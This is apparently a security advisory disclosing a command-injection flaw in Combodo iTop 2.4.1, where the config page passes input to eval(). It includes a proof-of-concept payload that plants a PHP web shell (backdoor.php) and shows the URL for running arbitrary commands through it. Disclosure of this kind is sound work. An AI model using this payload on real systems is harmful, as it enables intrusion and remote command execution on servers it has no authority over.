Product: iTop
Vendor: Combodo
Vulnerable Version(s): 2.4.1 and probably prior
Tested Version: 2.4.1
Vulnerability Type: Command injection
Risk Level: High
CVSSv3 Base Score: 8.4 [CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H]
Discovered by : Ayoub ARBAH 
 
-----------------------------------------------------------------------------------------------
 
The source code file http://[host]/itop/web/env-production/itop-config/config.php contains a function called TestConfig() that calls the vulnerable function eval().

To exploit this vulnerability the attacker must have the administrator priviledge and add the folowing script to the plateform configuration at this URL : http://[host]/itop/web/env-production/itop-config/config.php
shell_exec('echo "<pre><?php echo shell_exec($_GET[\'cmd\']);?></pre>" > backdoor.php');

After applying the new configuration, the attacker can execute arbitirary commands by accesing the folowing link :
http://[host]/itop/web/env-production/itop-config/backdoor.php?cmd=[command]
